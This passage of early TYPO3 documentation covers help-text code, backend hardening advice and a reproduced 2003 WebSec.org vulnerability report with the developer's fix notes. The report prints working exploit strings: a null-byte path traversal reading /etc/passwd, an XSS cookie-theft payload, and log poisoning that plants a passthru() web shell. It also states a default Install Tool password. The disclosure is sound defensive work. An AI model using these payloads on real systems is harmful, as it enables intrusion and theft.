<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* Default&nbsp;&nbsp;TCA_DESCR for &quot;_MOD_web_layout&quot;<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$LOCAL_LANG&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'default'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'quickEdit.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'The Quick Editor gives you direct . . . '</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'quickEdit.details'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'The Quick Editor is designed to cut . . .'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'quickEdit_selElement.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'This is an overview of th. . . '</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'columns.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'By the \&quot;Columns\&quot; view you can control t. . . '</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">(Location is
&quot;sysext/cms/locallang_csh_weblayout.php&quot; and in
ext_tables.php for the &quot;cms&quot; extension you will find this
line to associate the locallang file with CSH for the Web&gt;Page
module:
t3lib_extMgm::addLLrefForTCAdescr('_MOD_web_layout','EXT:cms/locallang_csh_weblayout.php');
)</P>
<P CLASS="western">Notice the key &quot;
quickEdit_selElement.description&quot; which will provide the
description for the help icon in the example.</P>
<H5 CLASS="western">Example 2</H5>
<P CLASS="western">A more advanced - and better - approach is to
create a function internally in the script class of the module for
handling the help texts. This is an example from the Extension
Manager module (mod/tools/em/index.php):</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">function </FONT><FONT COLOR="#0000bb">helpCol</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$key</FONT><FONT COLOR="#007700">)&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;global </FONT><FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;if (</FONT><FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">uc</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;edit_showFieldHelp&quot;</FONT><FONT COLOR="#007700">])&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$hT </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#0000bb">trim</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">t3lib_BEfunc</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">helpText</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">descrTable</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">&quot;emconf_&quot;</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#0000bb">$key</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">backPath</FONT><FONT COLOR="#007700">));</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return </FONT><FONT COLOR="#dd0000">'&lt;td&gt;'</FONT><FONT COLOR="#007700">.</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</FONT><FONT COLOR="#0000bb">$hT</FONT><FONT COLOR="#007700">?</FONT><FONT COLOR="#0000bb">$hT</FONT><FONT COLOR="#007700">:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">t3lib_BEfunc</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">helpTextIcon</FONT><FONT COLOR="#007700">(</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">descrTable</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">&quot;emconf_&quot;</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#0000bb">$key</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">doc</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">backPath</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#007700">)).</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'&lt;/td&gt;'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;}</FONT>
<FONT COLOR="#007700">}</FONT>
</PRE><P CLASS="western">
The basic elements are the same, but its more comfortable to work
with.</P>
<P CLASS="western">If you want more examples you can make a source
code search for the function -&gt;loadSingleTableDescription and
$TCA_DESCR and then you should find a number of examples to learn
from as well.</P>
<H4 CLASS="western">Method 2: Using t3lib_BEfunc::cshItem()</H4>
<P CLASS="western">This is the quick method. Calling this function
instead of t3lib_BEfunc::helpText() will deliver an output which is
either a help-icon or a table with both icon and description text
depending on the current users configuration. In addition it will
automatically load the description files for the $table parameter
given.</P>
<P CLASS="western"><BR>
</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#0000bb">$HTMLcode</FONT><FONT COLOR="#007700">.=<BR></FONT><FONT COLOR="#0000bb">t3lib_BEfunc</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">cshItem</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$tableIdent</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#dd0000">'quickEdit'</FONT><FONT COLOR="#007700">,</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">);</FONT></PRE><H2 CLASS="western">
<A NAME="2.10.Security in TYPO3|outline"></A>Security in TYPO3</H2>
<H3 CLASS="western"><A NAME="2.10.1.Default security includes:|outline"></A>
Default security includes:</H3>
<P CLASS="western">The security dealt with here regards the backend
of TYPO3.</P>
<UL>
	<LI><P CLASS="western">Passwords for backend login are not sent
	clear-text (front-end user logins are!). They are md5-hashed
	together with a unique string sent from the server and thus hard to
	decipher. Editing the passwords in the backend interface also
	md5-hashes the password before it's sent to the server.<BR>This is
	not true encryption, it just makes it hard to find/guess the
	passwords.</P>
	<LI><P CLASS="western">Sessions for backend and frontend users are
	done with a 32 byte cookie (md5-hash) which is looked up in the
	database and restores the session. A session lasts for little less
	than 2 hours with idle-time. Sessions might be locked to (parts of)
	the remote IP address of the user and the HTTP_USER_AGENT
	identification string to prevent session hi-jacking.</P>
</UL>
<H3 CLASS="western"><A NAME="2.10.2.Additional security measures you can take:|outline"></A>
Additional security measures you can take:</H3>
<UL>
	<LI><P CLASS="western">Add a .htaccess file to the typo3/ source
	code directory. This will “webserver protect” the backend
	interface. Backend users will have to type in two passwords: First
	the general webserver password, then the user-specific TYPO3
	password.<BR>The authenticated web-server user is not used by TYPO3
	in any way. It just adds another gate in the authorization
	process.<BR><B>Notice:</B> This solution will not work if you are
	using file resources (such as images) from extensions in your
	frontend! That might be the case if your site uses frontend plugins
	from extensions installed as &quot;system&quot; or &quot;global&quot;.
	If an image is referenced on the site it will trigger an
	authorization box to pop up! The solution could be to install the
	extension as &quot;local&quot; (in typo3conf/ext/) where the
	directory is not password protected.</P>
	<LI><P CLASS="western">Add IP-filtering (see
	TYPO3_CONF_VARS[BE][IPmaskList]) - this enables you to lock out any
	backend users which are not coming from a certain IP number range.</P>
	<LI><P CLASS="western">Add lockToDomain in be_users/be_groups
	records (makes sure that users are logging in only from certain
	URL's - maybe some secret admin-url you make?)</P>
	<LI><P CLASS="western"><A HREF="#Changing%20the%20default%20“typo3/”%20directory%7Coutline">Change
	name of the &quot;typo3/&quot; backend directory</A> (makes it
	harder to guess the administration URL).</P>
	<LI><P CLASS="western">Set the TYPO3_CONF_VARS[BE][warning_mode] and
	TYPO3_CONF_VARS[BE][warning_email_addr] - that will inform you of
	logins and failed attempts in general.</P>
	<LI><P CLASS="western">Use https for all backend activity. That will
	make sure that your passwords and data communication with the server
	are truely encrypted. TYPO3_CONF_VARS[BE][lockSSL]=1 will force
	users to use https.</P>
</UL>
<H3 CLASS="western"><A NAME="2.10.3.Recommendations|outline"></A>Recommendations</H3>
<P CLASS="western">In the core group we are only directly concerned
with security of the source code libraries/scripts plus extensions.
Whatever scripts are located in fileadmin/ or typo3conf/ - basically
all local, <I>site-specific</I> scripts - are outside of our domain.
However these are our recommendations on how to deal with all the
site specific issues. Some of these suggestions are for paranoid
users, but now we mention them and you can determine the threat
yourself.</P>
<UL>
	<LI><P CLASS="western">Make sure your PHP-scripts does not output
	the path on the server if they are called directly. If you use the
	testsite package there are example scripts in fileadmin/ directory
	which will do so. That is called &quot;path disclosure&quot; and
	poses a security threat (some argues).</P>
	<LI><P CLASS="western"><B>SQL-dumps:</B> Don't store SQL-dumps of
	the database in the webroot - that provides direct access to all
	database content if the file position is known or guessed.</P>
	<LI><P CLASS="western"><B>locallang.php:</B> You might move the
	typo3conf/locallang.php file to a position outside of webroot and
	then use the typo3conf/localconf.php file to just include this other
	file from the absolute position. Some argues that it's a security
	problem to have the configuration file located inside the
	webroot.<BR><B>Example:</B> Make a file
	&quot;/home/mydir/real_localconf.php&quot; and put your
	configuration into that file. Then make the real
	&quot;typo3conf/localconf.php&quot; look like this:</P>
	<PRE CLASS="western">&lt;?php
require(&quot;/home/mydir/real_localconf.php&quot;);
?&gt;<BR></PRE>
	<LI><P CLASS="western"><B>typo3/dev/ folder: </B>You might remove
	the typo3/dev/ folder since it contains development scripts only.
	They are however by default (or should be!) disabled by die()
	function calls.</P>
	<LI><P CLASS="western"><B>Install Tool: </B>Make sure to protect the
	Install Tool since it can be extremely harmful. By default the
	typo3/install/index.php script should be blocked by a die() function
	call which can be commented out when you need the script.
	Furthermore, calling the die() function depending on the IP address
	from REMOTE_ADDR is not considered secure enough! You should also
	change the default password from &quot;joh316&quot; to something
	else. Further you could add a &quot;.htaccess&quot; file to the
	&quot;typo3/install/&quot; directory. If you are really paranoid you
	can totally remove the typo3/install/ directory, but that's probably
	too far to go. 
	</P>
	<LI><P CLASS="western"><B>Disable &quot;Directory listing&quot;</B>
	in the webserver or alternatively add blank &quot;index.html&quot;
	to subdirectories like uploads/*, typo3conf/* or fileadmin/*. Most
	likely you don't want people to browse freely in your subdirectories
	to TYPO3.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">(Thanks to Martin Eiszner / @2002WebSec.org for
pointing out some of these issues)</P>
<H3 CLASS="western"><A NAME="2.10.4.PHP settings|outline"></A>PHP
settings</H3>
<P CLASS="western">PHP settings can also greatly influence security.
If you read the header of a “php.ini” file you will normally find
a list of the latest list of recommended settings for a production
environment. Our coding guidelines are encouraging developers to
program code compliant with these guidelines.</P>
<P CLASS="western">As a little snapshot these settings affects
security and could be enabled:</P>
<UL>
	<LI><P CLASS="western">Settings that will prevent PHP from revealing
	information about your system if an error occurs. However, this will
	be very disturbing to turn on in a development environment:</P>
	<PRE CLASS="western">log_errors = On<BR>display_errors = Off</PRE><P CLASS="western">
	</P>
	<LI><P CLASS="western">Enabled “open_basedir” and “safe_mode”
	for your server (TYPO3 3.6.0 is compliant!)</P>
</UL>
<H3 CLASS="western"><A NAME="2.10.5.Notice!|outline"></A>Notice!</H3>
<P CLASS="western">Generally, backend users in TYPO3 are expected to
be trusted to a certain degree. At least TYPO3 assumes that you are
in control of your backend users to a large extend and have a good
grip on their intentions. Therefore you should be aware that:</P>
<UL>
	<LI><P CLASS="western">Backend users are typically allowed to create
	HTML content elements which inserts <I>pure</I> HTML on webpages!
	Other elements allow for the same and there are many places where
	URLs are possible to insert. All of this means one thing: Ordinary
	backend users maintaining content <I>can exploit XSS techniques</I>
	since they can insert content on pages! This is <I>not </I>a bug in
	TYPO3 but a “feature” which is impossible to avoid if you at the
	same time want people to do exactly that; insert pure HTML on
	pages!<BR>Of course the problem is not big; you can always track
	down which user might have inserted malicious code on the pages
	through the backend log!</P>
</UL>
<H3 CLASS="western"><A NAME="2.10.6.XSS (Cross Site Scripting)|outline"></A>
XSS (Cross Site Scripting)</H3>
<P CLASS="western">TYPO3 has <I>not </I>been thoroughly screened for
XSS bugs. However the general coding style of TYPO3 has always
implemented htmlspecialchars() and strip_tags() where necessary so
the state in regard to XSS should be fairly sound. We also include
guidelines for preventing XSS bugs in the official Coding Guidelines.</P>
<P CLASS="western">If you have found XSS bugs or generally want to
help out by testing or offering expertise on the matter, please let
us know.</P>
<H3 CLASS="western"><A NAME="2.10.7.Security reports|outline"></A>Security
reports</H3>
<H4 CLASS="western">www.WebSec.org security report on TYPO3 3.5b5,
january 2003</H4>
<P CLASS="western">January 2002 Martin Eiszner from WebSec.org
informed us of a list of security problems in TYPO3 version 3.5b5.
The issues were corrected in version 3.5.0.</P>
<P CLASS="western">The report is posted here with permission from
Martin Eiszner with Kasper Skårhøjs comments in red.</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western">&gt;2002@WebSec.org/Martin Eiszner
&gt;
&gt;=====================
&gt;Security REPORT TYPO3
&gt;=====================
&gt;
&gt;
&gt;Product: Typo3 (Version 3.5b5 / Earlier versions are possibly vulnerable
&gt;too)
&gt;
&gt;Vendor: Typo3 (http://www.typo3.com)
&gt;Vendor-Status: kasper@typo3.com informed 
&gt;Vendor-Patch: --- 
&gt;
&gt;Local: NO
&gt;Remote: YES
&gt;
&gt;Vulnerabilities: 
&gt;-path-disclosure
&gt;-proof of file-existense
&gt;-arbitrary file retrieval 
&gt;-arbitrary command execution 
&gt;-CrossSiteScripting / privilege escalation / cookie-theft 
&gt;-install/config files and scripts within webroot
&gt;
&gt;Severity: MEDIUM to HIGH
&gt;
&gt;Tested Plattforms: Linux / Slackware i686 / Apache 1.3.23 / PHP 4.1.2
&gt; 
&gt;
&gt;============
&gt;Introduction
&gt;============
&gt;
&gt;removed/vendor
&gt;
&gt;
&gt;=====================
&gt;Vulnerability Details 
&gt;=====================
&gt;
&gt;
&gt;0) CLIENT-SIDE DATA-OBFUSCATION 
&gt;
&gt;form-fields are obfuscated using client-side java-script routines.
&gt;after the fields are joined a java-script creates MD5-hashes and 
&gt;submits the form. 
&gt;
&gt;examples: index.php (account-data), showpic.php(name-checksum)
&gt;
&gt;attached perl-scripts (typo.pl/showpic.pl) demonstrate how to circumvent 
&gt;this protection. 
&gt;

<FONT COLOR="#ff0000">index.php:</FONT>
<FONT COLOR="#ff0000">The point of the MD5 hashing of passwords is to not transmit the password </FONT>
<FONT COLOR="#ff0000">in cleartext. That is working as it should: For each login a new random </FONT>
<FONT COLOR="#ff0000">hash is used to &quot;encrypt&quot; the sending of the password. This means that the </FONT>
<FONT COLOR="#ff0000">&quot;userident&quot; string is never the same even though the same password is sent. </FONT>
<FONT COLOR="#ff0000">Your proof-of-concept script only emulates the login-form allowing for making </FONT>
<FONT COLOR="#ff0000">looped login-attempts. Isn't that correct? Pls. comment.</FONT>
<FONT COLOR="#ff0000">NOT FIXED - It works as intended and higher security must - as far as I can </FONT>
<FONT COLOR="#ff0000">see - be obtained by application of other external methods in addition. See</FONT>
<FONT COLOR="#ff0000"> http://typo3.org/doc+M561953c3fc3.0.html</FONT>

<FONT COLOR="#ff0000">showpic.php/thumbs.php:</FONT>
<FONT COLOR="#ff0000">In these scripts the point of MD5-hashes is simply to make it hard for people</FONT>
<FONT COLOR="#ff0000"> to spontaneously change a parameter to the script. This is made difficult </FONT>
<FONT COLOR="#ff0000">because you'll need computing of the MD5-hash. So this is not meant to be </FONT>
<FONT COLOR="#ff0000">totally impossible, but just plain hard preventing casual users from trying. </FONT>
<FONT COLOR="#ff0000">FIX: I have included a server-known key in the MD5 hash so </FONT>
<FONT COLOR="#ff0000">it can't be reconstructed.</FONT>




&gt;1) PATH-DISCLOSURE 
&gt;
&gt;several test-, class- and library-scripts can be found within webroot.
&gt;some of them can be forced to produce runtime errors and output their 
&gt;physical path.
&gt;
&gt;example: /fileadmin/include_test.php

<FONT COLOR="#ff0000">This script exists only with the testsite. This script is therefore not </FONT>
<FONT COLOR="#ff0000">a part of the TYPO3 source code and the responsibility to remove this </FONT>
<FONT COLOR="#ff0000">script - and further make sure that such scripts does not in general </FONT>
<FONT COLOR="#ff0000">exist! - lies on the developer/implementator of a TYPO3 solution.</FONT>
<FONT COLOR="#ff0000">NOT FIXED - the testsite-package will still ship with this script since </FONT>
<FONT COLOR="#ff0000">it's not a part of the TYPO3 source code as such. Users of the </FONT>
<FONT COLOR="#ff0000">testsite-package are responsible of removing this script themselves if </FONT>
<FONT COLOR="#ff0000">it disturbs them.</FONT>


&gt;2) PROOF OF FILE-EXISTENZ 
&gt;
&gt;&quot;showpic.php&quot; and &quot;thumbs.php&quot; allow an attacker to check the existense of 
&gt;arbitrary files.
&gt;
&gt;combined with file-enumeration methods it is possible to reconstruct parts 
&gt;of the directory- and filesystem - structure.
&gt;
&gt;example on howto check for existing files with attached perl-script
&gt;&quot;showpic.pl&quot;:
&gt;---*---
&gt;sh&gt; showpic.pl localhost '../../../../../../../../../../etc/hosts'
&gt;../../../../../../../../../../etc/hosts exists
&gt;---*---


<FONT COLOR="#ff0000">FIXED.</FONT>


&gt;3) CROSS SITE SCRIPTING / COOKIE-THEFT 
&gt;
&gt;all system and login-errors are saved in the typo3-database.
&gt;administrators can view all the erroneous data.
&gt;
&gt;since this data is not being checked for XSS-content it is possible to
&gt;include 
&gt;client-side script(java-script)-tags in these entries.
&gt;
&gt;every time the admins view their logs these scripts will be run on the
&gt;admins 
&gt;web-browser which leads to a typical XSS-bug. 
&gt;
&gt;thus making it possible to steal the admins-cookies or let him open a new 
&gt;user-account wihout his knowledge.
&gt; 
&gt;example with the attached &quot;typo.pl&quot; - perlscript:
&gt;
&gt;---*---
&gt;sh&gt; typo.pl localhost '&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;:aaa'
&gt;---*---
&gt;
&gt;viewing the logfiles will execute the script.


<FONT COLOR="#ff0000">FIXED.</FONT>


&gt;4) ARBITRARY FILE-RETRIEVAL 
&gt;
&gt;the &quot;dev/translations.php&quot; - script does not check the 
&gt;ONLY-parameter for malicious values.
&gt;
&gt;a relative path combined with a Nullbyte lead to the inclusion of the 
&gt;given file.
&gt;
&gt;example http-request:
&gt;---*---
&gt;GET
&gt;http://host/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00 
&gt;---*---
&gt;
&gt;5) ARBITRARY COMMAND EXECUTION 
&gt;
&gt;extends vulnerability number 4):
&gt; 
&gt;if the included file contains php-source code it will be executed.
&gt;thus allowing an attacker to execute operating-system commands and 
&gt;at long sight escalate his privileges.
&gt;
&gt;example:
&gt;---*---
&gt;
&gt;a file for placing our malicious php-source is needed.
&gt;if there is no file we have write-access we still can use the
&gt;websevers-logfiles.
&gt;
&gt;the following http-request:
&gt;---cut---
&gt;http://localhost/&lt;%3f %60echo %27&lt;%3fpassthru(%5c%24c)%3f&gt;%27 &gt;&gt;
&gt;./x.php%60 %3f&gt;
&gt;---cut---
&gt;
&gt;creates this entry:
&gt;
&gt;---cut---
&gt;[Tue Jan 14 19:42:53 2003] [error] [client 127.0.0.1] File does not exist:
&gt;/apachepath/apache/htdocs/&lt;? `echo '&lt;?passthru(\$c)?&gt;' &gt;&gt; ./x.php` ?&gt;
&gt;---cut---
&gt;
&gt;in a typicall apache - error_log file.
&gt;
&gt;using the method discussed under 4) the following http-request: 
&gt;
&gt;---cut---
&gt;http://localhost/typo3/typo3/dev/translations.php?ONLY=relative_apache_path/apache/logs/error_log%00'
&gt;---cut---
&gt;
&gt;will include the apach error_log in our output and execute our
&gt;php-commands.
&gt;as a result we will find x.php in our &quot;/dev&quot; directory.
&gt; 
&gt;x.php:
&gt;---cut---
&gt;&lt;?passthru($c)?&gt;
&gt;---cut---
&gt;
&gt;---*---
&gt;


<FONT COLOR="#ff0000">4+5 is FIXED.</FONT>
<FONT COLOR="#ff0000">NOTE: The dev/ folder contains scripts which are normally disabled by </FONT>
<FONT COLOR="#ff0000">a die() function call since they are used in special cases. The dev/ </FONT>
<FONT COLOR="#ff0000">folder scripts are not considered a real part of the TYPO3 source and </FONT>
<FONT COLOR="#ff0000">can be removed without any consequenses if a user wants to.</FONT>



&gt;6) SCRIPTS AND DIRECTORIES IN WEBROOT 
&gt;
&gt;a couple of scripts, libraries, files and directories can be found within
&gt;typo3s 
&gt;webroot. 
&gt;
&gt;&quot;/install&quot; is improper protected and vulnerable to brute-force attacks.

<FONT COLOR="#ff0000">The file install/index.php can be protected by a die() function call. </FONT>
<FONT COLOR="#ff0000">Developers are always encouraged to keep the script disabled during the </FONT>
<FONT COLOR="#ff0000">long periods where it is not used. However failure to do so may impose </FONT>
<FONT COLOR="#ff0000">a security hole. In particular if the default Install Tool Password is </FONT>
<FONT COLOR="#ff0000">not changed. </FONT>
<FONT COLOR="#ff0000">The security problem regards only careless use and warnings are plentyful </FONT>
<FONT COLOR="#ff0000">inside the Install Tool! However if any security holes in the PHP-scripts </FONT>
<FONT COLOR="#ff0000">exists that is a more interesting matter. I don't see any.</FONT>
<FONT COLOR="#ff0000">Paranoid users can safely remove this directory if they don't need the </FONT>
<FONT COLOR="#ff0000">install tool or alternatively insert a .htaccess file if they like.</FONT>
<FONT COLOR="#ff0000">NOT FIXED - responsibility is the on the user.</FONT>

&gt;&quot;/fileadmin&quot; directory reveals log-files and demo-scripts

<FONT COLOR="#ff0000">Depends on implementation. The &quot;fileadmin/&quot; directory is at the users </FONT>
<FONT COLOR="#ff0000">disposal and not a part of TYPO3's source code. </FONT>
<FONT COLOR="#ff0000">True enough, the testsite-package includes both logfiles and scripts there.</FONT>
<FONT COLOR="#ff0000">NOT FIXED - responsibility is the on the user.</FONT>


&gt;&quot;/typo3conf&quot; directory contains the localconf.php,database.sql and other
&gt;sensitive files

<FONT COLOR="#ff0000">localconf.php file is by default placed here. That is correct. The </FONT>
<FONT COLOR="#ff0000">directory must also be writeenabled according to TYPO3's requirements</FONT>
<FONT COLOR="#ff0000"> for a correct installation.</FONT>
<FONT COLOR="#ff0000">Paranoid users can always make a reduced localconf.php file which </FONT>
<FONT COLOR="#ff0000">includes another &quot;outside-of-webroot&quot; file if they like:</FONT>

<FONT COLOR="#ff0000">&lt;?</FONT>
<FONT COLOR="#ff0000">include(&quot;/outside_of_webroot/real_localconf.php&quot;);</FONT>
<FONT COLOR="#ff0000">?&gt;</FONT>

<FONT COLOR="#ff0000">As for the sql-file found there it's not a requirement of the source </FONT>
<FONT COLOR="#ff0000">code and in this analysis it stems from the testsite-package. </FONT>
<FONT COLOR="#ff0000">NOT FIXED - responsibility is on the user.</FONT>


&gt;=======
&gt;Remarks
&gt;=======
&gt;
&gt;the serious vulnerabilities rely on the &quot;/dev&quot; (developer?) - directory.
&gt;scripts within this directory can be found in many/most
&gt;production-environments!

<FONT COLOR="#ff0000">It's officially recommended to just remove this directory then.</FONT>


&gt;====================
&gt;Recommended Hotfixes
&gt;====================
&gt;
&gt;1) remove &quot;/install&quot; directory
&gt;2) remove &quot;/dev&quot; directory

<FONT COLOR="#ff0000">OK</FONT>

&gt;2) Choose strong administrator-passwords

<FONT COLOR="#ff0000">Always do. Also see this URL for further security actions you can take:</FONT>
<FONT COLOR="#ff0000">http://typo3.org/doc+M561953c3fc3.0.html</FONT>


&gt;3) showpic.php and thumbs.php must be patched.

<FONT COLOR="#ff0000">FIXED.</FONT>

&gt;3) remove all demo-directories and protect &quot;/fileadmin&quot; and &quot;/typo3conf&quot;

<FONT COLOR="#ff0000">Both directories are not part of the TYPO3 source code but relates to </FONT>
<FONT COLOR="#ff0000">the specific implementation. Responsibility therefore lies on the </FONT>
<FONT COLOR="#ff0000">developers implementation of a site with TYPO3. See above comments for </FONT>
<FONT COLOR="#ff0000">advises on these issues.</FONT>


&gt;EOF Martin Eiszner / @2002WebSec.org
&gt;
&gt;
&gt;=======
&gt;Contact
&gt;=======
&gt;
&gt;WebSec.org / Martin Eiszner
&gt;Gurkgasse 49/Top14
&gt;1140 Vienna
&gt;
&gt;Austria / EUROPE
&gt;
&gt;mei@websec.org
&gt;http://www.websec.org
&gt;</PRE><P CLASS="western">
<BR><BR>
</P>
<H2 CLASS="western"><A NAME="2.11.Files and Directories|outline"></A>Files
and Directories</H2>
<H3 CLASS="western"><A NAME="2.11.1.TYPO3 files and folders|outline"></A>
TYPO3 files and folders</H3>
<H4 CLASS="western">The TYPO3 source code-library consists of these
folders:</H4>
<P CLASS="western">If you have downloaded the &quot;typo3src_[xxx].tgz&quot;
version of TYPO3s source code you will see these directories:</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=25*>
	<COL WIDTH=231*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=10%>
				<P CLASS="western">folder</P>
			</TH>
			<TH WIDTH=90%>
				<P CLASS="western"><BR>
				</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=10%>
				<P CLASS="western">t3lib/</P>
			</TD>
			<TD WIDTH=90%>
				<P CLASS="western">TYPO3 libraries which are mostly for the
				backend, but some are used by the frontend as well. Includes a
				folder with fonts and graphics.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=10%>
				<P CLASS="western">typo3/</P>
			</TD>
			<TD WIDTH=90%>
				<P CLASS="western">TYPO3 backend administration directory. This
